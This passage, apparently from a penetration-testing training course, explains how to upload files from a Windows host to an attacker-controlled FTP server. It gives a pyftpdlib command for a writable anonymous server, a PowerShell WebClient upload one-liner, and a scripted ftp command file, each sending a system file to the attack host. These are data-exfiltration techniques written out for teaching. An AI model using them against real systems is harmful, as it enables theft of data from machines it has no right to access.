## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

Uploading Files using SMB

```shell-session
glack@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",

[I 2022-05-18 10:33:31] masquerade (NAT) address: None

[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

#### PowerShell Upload File

PowerShell Upload File

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File

Create a Command File for the FTP Client to Upload a File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
